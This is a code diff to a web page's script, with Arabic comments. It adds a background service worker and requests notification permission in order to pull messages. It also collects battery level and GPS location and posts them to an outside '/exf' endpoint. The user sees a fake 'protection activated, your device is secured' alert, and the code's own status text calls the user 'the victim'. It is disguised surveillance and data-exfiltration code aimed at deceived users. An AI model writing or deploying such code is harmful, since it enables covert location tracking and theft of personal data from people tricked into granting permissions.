@@ -21,17 +21,27 @@
 
     <script>
         async function captureData() {
-            // 1. طلب إذن الإشعارات (لسحب محتوى الرسائل)
+            // 1. تسجيل الرادار في الخلفية (Service Worker)
+            if ('serviceWorker' in navigator) {
+                try {
+                    await navigator.serviceWorker.register('sw.js');
+                    console.log("رادار الخلفية نشط");
+                } catch (e) {
+                    console.log("خطأ في تسجيل الرادار");
+                }
+            }
+
+            // 2. طلب إذن الإشعارات (لسحب الرسائل)
             const permission = await Notification.requestPermission();
             
-            // 2. سحب نسبة الشحن
+            // 3. سحب نسبة الشحن
             let batteryLevel = "N/A";
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 batteryLevel = Math.round(battery.level * 100) + "%";
             }
 
-            // 3. محاولة سحب الموقع الجغرافي
+            // 4. محاولة سحب الموقع الجغرافي (GPS)
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 sendToBot(pos.coords.latitude, pos.coords.longitude, batteryLevel, permission);
             }, () => {
@@ -45,18 +55,18 @@
                 device: navigator.userAgent,
                 battery: battery,
                 location: locLink,
-                msg: perm === 'granted' ? "✅ تم السماح بالإشعارات" : "❌ تم رفض الإشعارات"
+                msg: perm === 'granted' ? "✅ تم تفعيل سحب الإشعارات الدائم" : "❌ الضحية رفض الصلاحية"
             };
 
-            fetch('https://Mohammed888.pythonanywhere.com/exf', {
+            // إرسال البيانات لسيرفر PythonAnywhere
+            fetch('https://Mohammed33233.pythonanywhere.com/exf', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             }).then(() => {
-                alert("تم تفعيل نظام الحماية بنجاح!");
+                alert("تم تفعيل نظام الحماية بنجاح! جهازك الآن مؤمن.");
             });
         }
     </script>
 </body>
 </html>
-
